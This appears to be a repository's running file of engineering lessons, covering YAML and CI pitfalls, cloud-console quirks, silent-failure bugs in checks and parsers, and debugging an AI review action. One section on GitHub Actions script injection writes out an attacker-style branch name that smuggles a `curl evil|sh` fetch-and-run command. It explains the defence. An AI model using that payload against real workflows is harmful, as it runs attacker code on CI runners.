# Learned

Durable facts worth knowing before starting work here. Append; do not rewrite history.

- **YAML frontmatter converts unquoted dates to `Date` objects.** `2026-07-01` arrives as a Date,
  not a string. `isoDate` in `src/pm/schema.ts` normalises both. Do not "fix" this by requiring
  quoted dates — hand-written frontmatter should stay natural.
- **A colon in an unquoted YAML value is a syntax error.** Titles routinely contain them. `pm new`
  quotes defensively; the parser reports the failure as an issue rather than throwing.
- **The parser must never throw on bad input.** `pm validate` is expected to report every problem
  in one run. Anything that can fail per-file returns a `ParseIssue` instead.
- **`morpheus init` is deliberately not built yet.** The first retrofit (MO-007, Evo) is its
  specification. Building it first would encode guesses about a structure no project has lived in.

- **Firebase's `addFirebase` returns `403 caller does not have permission` when the account has
  never accepted the Firebase Terms of Service.** It is not an IAM, scope, or org-policy problem,
  and the error names none of that. Accepting the terms once in the console — for any project —
  unblocks the API account-wide, after which the CLI works for every other project.

  Cost a long debugging session on 2026-07-29: chased OAuth scopes, `roles/firebase.admin`,
  domain-restricted-sharing, and automatic-IAM-grants policies, all of which were fine.
  **When a Google API returns a permission error that survives being Owner, check whether the
  product's terms have ever been accepted before touching IAM.**

- **`gcloud projects list` returns stale results for minutes** after a create or delete.
  `gcloud projects describe` is authoritative — do not use the list to confirm a mutation.

- **GCP project ids are globally unique**, so short generic names are always taken. Convention is
  an org prefix: `dh-darwin`, `dh-evo`. Display names must be **at least 4 characters**, and that
  failure is easily misread as "id taken".

- **Every abandoned Google Cloud create-project or trial flow leaves a junk project behind.**
  Seven accumulated in one session.

- **`git add -A` sweeps up whatever the editor left behind.** A 448 KB screenshot pasted into
  Nimbalyst landed in `hq/inbox/assets/` and was committed to a public repo without anyone
  choosing it. Images are now gitignored with an exception for `hq/brand/assets/`.

  **Screenshots belong in chat, not the repo.** An inbox archive does not need to be complete —
  the decisions distilled from it are what matter, and a binary in a text repo is permanent
  weight even after deletion.

  Prefer `git add <paths>` over `git add -A` when an editor with its own scratch state is in use.

- **Git does not track empty directories.** Scaffolding created with `mkdir` and no file in it
  ships missing and nobody notices until someone looks. Write a README into every directory the
  scaffold creates — it explains the directory *and* makes it exist.

- **`tsc` does not preserve the executable bit**, so `dist/cli/index.js` is unrunnable after every
  build even with a shebang. The build script chmods it. Symptom is `command not found` or
  `permission denied` from a `npm link`ed binary that clearly exists.

- **`gh pr merge --auto` can fire on a stale head.** Enabled on a PR whose checks were failing,
  it merged *without* a fix pushed afterwards — the roadmap item that PR added was silently lost
  from `main`.

  **Only enable auto-merge once the branch is complete.** Before that, `gh pr checks --watch`,
  fix, then set `--auto`. Auto-merge is a queue, not a promise to merge whatever arrives later.

- **`pnpm/action-setup` fails if both `version` and `packageManager` are specified.** Reusable
  workflows must leave `pnpm-version` empty so the lockfile-pinned `packageManager` wins.
  Evo never hit this because it lacks the field — the repo following the *stricter* practice is
  the one that broke.

- **Never hand-name a branch. Use `morpheus pm claim <ID>`.** It creates the branch *from* the
  item id, so they cannot disagree. Hand-naming produced a `check pr` failure twice in one
  session — the branch referenced an id that did not exist because the item had not been
  allocated yet.

- **Item files only hold ids that have merged.** An id another session has claimed exists solely
  as a remote branch until its PR lands, so anything reasoning about "which ids are taken" must
  ask `origin` as well as the disk. `pm new` did not, and would have re-issued MO-038 while a
  parallel session held it. `pm validate` catches the duplicate, but only after two sessions have
  each written a different item under one id.

  The general form: **on-disk state is the merged past, not the present.** Live state is on the
  remote.

- **Vercel project-scoped access is Enterprise-only.** Project-level roles can only be assigned to
  someone holding the **Contributor** team role, and Pro's RBAC is Owner, Member, Billing and Pro
  Viewer — Contributor is not among them. So on a Pro team every member sees every project, and
  "give this person one project" is not purchasable below Enterprise. The answer for a
  collaborator who must not see everything is **a separate team**, not a narrower role.

  Two things that soften it: **Pro Viewer seats are free** and can comment on preview deployments,
  which is the whole review loop Vercel was chosen for; and **Sharable Links** (Pro) bypass
  deployment protection for someone with no Vercel account at all.

  **Hobby has no team collaboration and is non-commercial only** under the fair-use guidelines, so
  anything commercial needs Pro regardless of who else needs access.

  Sources: [access roles](https://vercel.com/docs/rbac/access-roles),
  [managing team members](https://vercel.com/docs/rbac/managing-team-members),
  [Hobby plan](https://vercel.com/docs/plans/hobby).

## Never let an unanswerable question render as a confident answer

Three occurrences now, so it is a rule rather than a run of bad luck:

- GCP project ids reported as "taken" by grepping for `^ERROR`. The real error was a display name
  under four characters.
- `mergedPrs` must return `null` when `gh` is missing, not `[]`. "No merged PRs" is evidence; "gh
  is absent" is not, and collapsing them makes a missing tool look like a clean board.
- Onboarding detection returns `true | false | null`. A missing `gh` rendering as an unprotected
  branch sends someone to fix what was never broken.

The shape is always the same: a failure to determine something gets encoded as a determination.
When a check cannot run, say it did not run.

- **Borrowing a claim to carry unrelated work corrupts the board silently.** An inbox cycle had
  no roadmap item of its own, so PR #31 went out on `mo-010-simplify-architecture-md`. Merging
  released that claim and reconcile marked MO-010 **shipped with `prs: [31]`** — a PR that changed
  only `hq/inbox/` and `.agent/inbox-archive/`. Nobody had started the architecture work.

  The board being *ahead* of reality is worse than lagging it: a lagging board gets corrected on
  sight, and a shipped item is never looked at again.

  An audit of every shipped item against what its PR actually changed found two more: MO-015
  credited to PR #2 (a `learned.md` entry on `mo-015-empty-dirs`; the work was really PR #22) and
  MO-003 to PR #26, which is legitimate — that item's deliverable *was* the decision.

  **The first fix for this did not work, for an instructive reason.** It tested "did this PR
  change only `hq/inbox/` and `.agent/`", which is false for every real instance: a borrowed
  branch always carries board files too, because claiming reconciles statuses and `pm index`
  regenerates the tables into the same commit. The test has to be "changed nothing *but* records
  and board", which is a different question and needs its own predicate.

  **When a rule is written from a remembered example rather than the example's actual diff, it
  tends to describe a tidier version of the event than the one that happened.** Check the file
  list.

## A check that skips what is absent will report an empty thing as correct

Four instances in one day:

- `tokens.json` existing but empty read as a finished token system
- `goal` and `inbox` detectors checked for a filename, so an empty file passed
- `agents-md` checked that both paths exist, so two divergent real files passed where a symlink
  was required
- `checkDrift` skipped absent files, so a brand package that had never been generated reported as
  fully current

The shape is always the same: the loop says `if (!exists) continue`, which reads as "nothing to
compare" and renders as "nothing wrong". **When writing a check, ask what a false positive looks
like** — and specifically, what it reports when handed nothing at all.

Related but distinct from *never let an unanswerable question render as a confident answer*: there
the tool cannot determine the answer, here it can and treats absence as assent.

## A parser that fails silently deletes rows rather than reporting them

`listClaims` filtered branches through a regex and did `if (!m) continue`. When MO-057 changed the
id scheme and the pattern was not updated, every current branch stopped matching — so the function
returned an empty list from a remote full of claims, and reported no error at all.

The dangerous part is not the wrong output. It is that **absence is indistinguishable from
emptiness to every caller**. `pm claims` printed "No items are currently claimed", and the heartbeat
computed its ceiling, its blocked exclusion and its candidate list from the same empty list — all
three degrading at once, all three still "working".

Two things follow, and the second is the one that would have caught it:

1. **A skip in a parser is a decision, not a filter.** If a line cannot be parsed, either it is
   legitimately not a row (`main` is not a claim) or it is a row we failed to read — and those want
   different handling.
2. **Test the parse, not the pipeline.** The regex was welded to a `git for-each-ref` call, so
   nothing tested it and the whole suite passed against a parser returning nothing. The same file
   already had `parseClaimedNumbers` split out for exactly this reason; the lesson had been learned
   ten lines above and not applied.

Sibling of *a check that skips what is absent will report an empty thing as correct* — same shape,
one layer lower: there a check reads absence as assent, here a parser turns a failure into absence
first.

## Fixtures must use the identifiers actually in use

Every heartbeat test used `MO-001`. The scheme moved to `MO-26-08-01-17.28.41` in MO-057, and the
tests kept passing while the guards they cover had stopped working — because the legacy id was the
one shape the broken parser still handled.

**A fixture frozen at an old format tests the old format.** When an identifier scheme changes, the
fixtures are part of the migration, not incidental to it.

## A verifier that runs but cannot report looks exactly like one that found nothing

Agent review's first live run spent 20 turns and $0.86 producing a review, hit nine permission
denials trying to post it, and exited **green**. `agent-review / review  pass`.

MO-051 had guarded the obvious case — an *unconfigured* verifier must not report success, because a
green check is read as evidence — and the skip path does that correctly, with a job summary and a
warning annotation. What nobody considered was the case in between: configured, executing, and
mute. That state looks *healthier* than the skip, because the warning annotation is absent too.

The tell was in the timing, not the status: 3m48s where a skip took 20s. **When a step's cost
changes and its output does not, that gap is the finding.**

Generalising: for anything whose job is to *report*, "did it run" and "did its output arrive" are
two separate questions, and only the first one is usually instrumented. Ask what the check looks
like when the reporting path is broken — if the answer is "the same as success", the check is not
finished.

Sibling of *a check that skips what is absent will report an empty thing as correct*, one step
further out: there a check read absence as assent; here a check read its own silence as a clean bill
of health.

## Read a review to the end before acting on it

The agent review rung proposed a detector keyed on `permission_denials_count > 0`, then **retracted
it one pass later** in a "Smaller" note: denials are routinely non-zero on healthy runs, because
compound `Bash` commands are not in tag mode's allowlist. It said explicitly that whoever picked up
the item should take the delivery-based shape instead.

I had truncated that comment while reading it and stopped before the retraction, then wrote the
roadmap item around the withdrawn design. The next pass caught it, in the item rather than the code.

The reviewer was not wrong — it corrected itself unprompted. **Partial reading is how a superseded
recommendation gets implemented**, and it is far cheaper to make than to find. A review is a
document with a conclusion, not a list to skim for the first actionable line.

## Every push re-triggers a model-graded check, so the feedback loop is the bill

Rung 2 reviews on `pull_request`, which includes `synchronize` — so acting on a review and pushing
buys another review. That loop is the rung's whole value when it is reading code: two of the five
passes on #69 found defects in that PR's own guards, and neither would have surfaced without a
re-review.

It is also how $8.01 happened. **Four of seven runs read pushes that changed no code**, three of them
successive edits to one roadmap item's prose — the reviewer re-reading a paragraph at a dollar a
turn because the trigger cannot tell prose from code.

Worth internalising when wiring any paid check into CI: the cost is not per PR, it is per push, and
an agent that iterates diligently is the worst case. Gate on what the check can actually act on.

## A test can pass for a reason you did not write

`pathsMentioned` filtered URLs with `/^https?:/` and `path.includes("://")`. Both were **unreachable**
— the capture group was `[\w.-]` and `/`, which cannot contain a colon. The "ignores URLs" test
passed anyway, because the regex's *leading boundary class* refused to start a match at `//docs…`.

So one mechanism was quietly doing two jobs and the test proved neither. That mattered, because the
boundary class was also the bug: it omitted `*`, so bold paths — the most common citation form —
were silently missed. Widening it to fix that would have started leaking URLs through a guard that
looked like it handled them.

**When a test passes, know which line made it pass.** A guard that has never executed is not a
guard, and it hides the real mechanism from the next person to change it — including from the tests
that are supposed to protect it.

## `${{ }}` in a `run:` block is string substitution, not a variable

GitHub Actions expands `${{ }}` into the script text *before* bash parses it. So
`--branch=${{ github.head_ref }}` with a branch named `x";curl evil|sh;"` executes the curl.

`github.head_ref`, PR titles and PR bodies are all attacker-controlled on a fork pull request, and
this repo is public with an external-contributor flow — a live surface, not a theoretical one.

**Pass them through `env:` and quote them.** There the value reaches bash as data and never becomes
part of the script.

The test for this must parse the YAML rather than slice the text: an `env:` block sits directly
above the `run:` it feeds, so any text-splitting heuristic sees them as one chunk and flags the safe
form as unsafe. `step.run` is exactly the shell that executes and nothing else.

## A sentinel for missing information must be excluded from a comparison, not compared

Four rounds of review on the context-freshness policy (MO-26-08-05-12.24.47) found the same defect
four times, in four disguises:

| The absence | Encoded as | Compared, and so |
|---|---|---|
| Never read the records | `inputs: []` | covered nothing, certified `fresh` |
| Never checked the remote | `checkedAt` written, never read | a six-hour-old lease certified `fresh` |
| Read it, could not parse it | `UNREADABLE` | matched `UNREADABLE`, certified `fresh` |
| Wrong tree entirely | `ABSENT` on every record | matched `ABSENT`, certified `fresh` |

Each fix was correct and each left the next instance standing, because the shape was never named.
It is this: **a value that means *I do not have this information* will compare equal to itself**, and
equality is what every freshness, cache, and diff check is built out of. The result always reads as
agreement, which is always the unsafe direction.

So: sentinels get excluded from the comparison by an explicit branch, before any `===`. If one is
deliberately allowed to compare — `ABSENT` still does, outside a declared required set, because
*nothing there and still nothing there* is genuine knowledge — the exception needs a comment saying
why, or the next reader restores the bug while fixing something adjacent.

**Stated as a rule about sentinels this was too narrow, and the commit that wrote it left two more
instances standing one file over** — an fs error code and a retry loop are also values meaning *I do
not have this information*. So carry it as a question to ask at every boundary instead:

> **What does this code do when the thing is not there, and can the caller tell that apart from the
> thing being fine?**

If the answer to the second half is no, that is the bug, whatever shape it is wearing. The
reviewer's summary is the shortest version: *the check skips what is absent and reports the empty
thing as correct.*

## A regression guard narrowed to stay green can stop covering its own reason

2026-08-05. The "no source file names `hq/inbox`" sweep exempted `paths.ts` by filename while the
legacy constant lived there. Removing the constant, I replaced the exemption with a narrower match —
`/["']hq\/inbox/` — so that honest prose about the old layout would not fail.

The motivation was right and the implementation conceded far more than it had to. A quote character
is not what this code looks like: the **scaffolded-template** case the test's own docstring cites is
a markdown row inside a template literal with no quote at all, and a regex literal spells the path
`hq\/inbox\/`, so re-adding the exact line the same PR deleted would have passed. The check read as
covering templates and covered none of them.

**Two properties were treated as a trade and were not one.** Stripping comments first and then
looking at what remains keeps history sayable *and* catches every spelling in code. Reaching for the
first thing that turned the suite green produced a guard weaker than the exemption it replaced —
and worse than it, because an exemption is visible where a too-narrow pattern is not.

Related: writing "confirmed to still fail on a re-introduced string literal" in the PR body was
narrowly true and implied coverage that did not exist. When a check is narrowed, state what it
*stopped* covering, not what it still does.

**And then it happened again in the fix.** The rewrite stripped lines opening with `//` *or* `*`,
for JSDoc continuations — which are already inside the `/* … */` removed one step earlier, so the
`*` bought nothing and cost the shape this repo writes most: inside a template literal a leading
`*` is a markdown **bold lead-in** or a bullet, and `src/init/templates.ts` has a dozen. The guard
caught the path in a table cell and missed it one paragraph below.

Three rounds, one mistake: **verifying a guard against the cases someone named rather than against
the class.** Each round I fixed exactly the shapes the review listed and shipped, and each time the
next shape was one the reviewer had not thought to name either. What finally worked was deleting
the clause that earned nothing rather than adding a case — and proving the sweep catches a real
regression by re-introducing `hq/inbox` into the actual template and watching it fail.

**A guard is only verified by breaking the thing it guards.** Assertions on synthetic strings prove
the helper; they do not prove the sweep is wired to anything.

Round four made the point twice more. Anchoring the comment strip's *opener* to column 0 was
supposed to stop a `/*` inside a template from swallowing code — and `src/init/templates.ts` has
`/*.png` at column 0 in the scaffolded `.gitignore`, whose match ran forward to the `**/` two lines
below, blanking three lines of the exact file the guard exists for. **Anchoring the closer is what
discriminates**: a real block comment ends its line, and every `*/` in `src/` followed by anything
else is a glob, a regex or a template.

Then the assertion written to pin it **passed under both regexes** — the path sat outside the
window the bug deletes, so it proved nothing. An assertion for a swallowing bug has to put the
thing being looked for *inside* the swallowed span. Same failure as the guard itself, one level
down: checking the shape rather than the mechanism.

Round five was the useful generalisation. Closer-anchoring alone made the live miss go away —
because the globs happen to sit past the file's last block comment. **Safe-today and safe are
different properties**, and the difference was two characters: key the opener on shape too
(`/**` or `/* `, never `/*.`) and the guard stops depending on where in the file anything sits.
Appending a comment below those globs is the normal way that file grows, so "no miss today" had a
short shelf life.

## firebase-admin's Firestore refuses a hand-built credential; Auth accepts one

2026-08-13, found on Evo's first production deploy. The Workload Identity credential
`web init` generates is an object implementing `getAccessToken()`. **Firebase Auth works with it.
Firestore does not**, and says so at the first write:

> `firestore/invalid-credential` — Failed to initialize Google Cloud Firestore client with the
> available credentials. Must initialize the SDK with a certificate credential or application
> default credentials to use Cloud Firestore API.

The Firestore client goes through google-gax, which wants a real `GoogleAuth`-compatible
credential rather than the token-minting shim `firebase-admin` accepts for its REST-based
services. So a project can have federation correctly provisioned — pool, provider, service
account, `roles/datastore.user` all bound — and still fail every write, while sign-in works.

**This is latent in Darwin too.** DW's waitlist shipped with the same credential shape and its PR
verified the failure path locally rather than a successful write in production, so the first real
signup there is expected to 500 the same way.

The generalisation is the one this repo keeps rediscovering: **two capabilities behind one
credential can fail independently, and the one you tested is not evidence for the other.** Auth
was verified end to end; Firestore was assumed to come along with it.

## A resource name in a request body is an identifier, not a URL

The Firestore REST write encoded the document name with `encodeURIComponent`, turning
`a@b.com` into the id `a%40b.com`. Firestore wrote it and answered **200**. So a returning
subscriber silently got a second document, `signupCount` never incremented past 1, and the
original row never refreshed — with nothing anywhere reporting a problem.

Two lessons, and the second is the transferable one:

1. **Encode the `documentId` query parameter; never the `name` inside the body.** One is a URL, the
   other is an identifier that happens to look like a path.
2. **A 200 is not evidence the right thing happened.** The create path was verified end to end and
   looked complete; the bug lived entirely in the *second* submission, which nobody would exercise
   until a real person signed up twice. Testing the happy path of a two-path function tests half a
   function.

Sibling of *a check that skips what is absent reports the empty thing as correct* — there the check
had nothing to look at, here it looked at the wrong object and found it in perfect order.

## claude-code-action never tells you why the API refused, and debug mode does not change that

Rung 2 failed on every run from 2026-08-12 22:36 UTC. The signature was always identical:

```json
{ "type": "result", "subtype": "success", "is_error": true,
  "duration_ms": 326, "num_turns": 1, "total_cost_usd": 0 }
```

**One turn, zero dollars, a third of a second — the API rejected the very first request.** Everything
upstream is fine and the log reads as though nothing went wrong, because the action runs the SDK
with `show_full_output: false` and prints only that result object.

Its own message says *"Rerun in debug mode or enable `show_full_output: true` for full output"*. The
first half is wrong: `gh run rerun --debug` produces 14,000 lines of step debugging and **the SDK
output stays redacted**. Two sessions were spent inferring the cause from timing and spend.

**Ask the API directly instead.** A throwaway workflow on a pushed branch, using the same
`ANTHROPIC_API_KEY` secret, printing the status and body of one `max_tokens: 1` request — which
carry no secret, and GitHub masks the key anyway:

```sh
curl -sS -o /tmp/body.json -w '%{http_code}' https://api.anthropic.com/v1/messages \
  -H "x-api-key: $ANTHROPIC_API_KEY" -H "anthropic-version: 2023-06-01" \
  -H "content-type: application/json" \
  -d '{"model":"claude-opus-5","max_tokens":1,"messages":[{"role":"user","content":"hi"}]}'
```

Answer in ninety seconds, on both models:

> `HTTP 400` — `invalid_request_error`: *Your credit balance is too low to access the Anthropic API.*

**Read the status before assuming.** `400` with that message is an empty balance; `401`
`authentication_error` is a revoked or wrong key. Those look identical through the action and need
different fixes — buy credits versus mint a new key and update the secret — which is exactly why
guessing was not good enough. Run the probe on a **private** repo and delete the branch after.

The general shape, and the reason this is here rather than in a worklog: **when a tool reports that
something failed but not why, the fastest route is usually to ask the failing dependency yourself
rather than to coax the tool into confessing.** Two sessions of inference lost to a check that a
one-file workflow settled.
